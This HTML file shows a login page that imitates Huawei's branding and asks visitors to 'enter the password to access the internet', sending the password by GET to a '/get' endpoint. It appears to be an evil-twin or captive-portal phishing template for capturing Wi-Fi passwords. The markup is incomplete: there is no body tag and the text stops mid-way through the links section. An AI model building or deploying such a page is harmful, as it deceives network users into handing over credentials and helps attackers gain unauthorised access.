<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Huawei Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }

        header {
            width: 100%;
            padding: 40px 0 20px 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo-container {
            width: 180px;
            height: auto;
        }

        .login-box {
            width: 100%;
            max-width: 360px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }

        h2 {
            font-size: 24px;
            font-weight: 400;
            color: #000;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 14px;
            color: #888;
            margin-bottom: 40px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 40px;
            text-align: left;
        }

        .input-wrapper label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin-bottom: 8px;
        }

        input[type="password"] {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid #e5e5e5;
            font-size: 16px;
            outline: none;
            background: transparent;
            transition: border-color 0.3s;
        }

        input[type="password"]:focus {
            border-bottom: 1px solid #cf0a2c; 
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #cf0a2c;
            color: #fff;
            border: none;
            border-radius: 25px; 
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background-color: #b00925;
        }

        .links {
            margin-top: 25px;
            display: flex;
            justify-content: space-between;
        }

        .links a {
            font-size: 14px;
            color: #007dff;
            text-decoration: none;
        }

        footer {
            margin-top: auto;
            padding-bottom: 30px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>

<div class="login-box">
    <h2>Log In</h2>
    <p class="subtitle">Please enter the password to access the internet</p>

    <form action="/get" method="GET">
        <div class="input-wrapper">
            <label>Password</label>
            <input type="password" name="password" placeholder="Enter password" required autofocus>
        </div>
        <button type="submit">Log In</button>
    </form>

    <div class="links">
        <a href="#">Forgot password?</a>
